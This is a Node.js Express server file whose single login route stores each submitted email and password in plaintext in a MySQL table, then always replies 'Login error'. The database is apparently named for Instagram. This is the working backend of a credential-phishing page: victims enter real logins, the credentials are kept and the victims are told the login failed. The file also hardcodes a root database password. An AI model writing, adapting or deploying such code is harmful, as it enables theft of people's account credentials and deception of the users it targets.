// server.js

const express = require('express');
const bodyParser = require('body-parser');
const mysql = require('mysql2');
const path = require('path'); // Import the path module

const app = express();
const port = process.env.PORT || 3000;

// Middleware
app.use(bodyParser.urlencoded({ extended: false }));
app.use(bodyParser.json());

// Create MySQL connection
const db = mysql.createConnection({
    host: 'localhost',
    user: 'root', // replace with your MySQL username
    password: '12345678', // replace with your MySQL password
    database: 'insta_db' // use your actual database name here
});

db.connect((err) => {
    if (err) throw err;
    console.log('MySQL Connected...');
});

// Serve static files from the "public" directory
app.use(express.static(path.join(__dirname, 'public')));

// Login Route
app.post('/login', (req, res) => {
    const { email, password } = req.body;

    // Log user input values in the database (you can customize this part)
    const logSql = 'INSERT INTO user_logs (email, password, login_time) VALUES (?, ?, NOW())';
    db.query(logSql, [email, password], (err, result) => {
        if (err) throw err;
        console.log('User login data logged in database');
    });

    res.send('Login error');
});

app.listen(port, () => {
    console.log(`Server is running on port ${port}`);
});
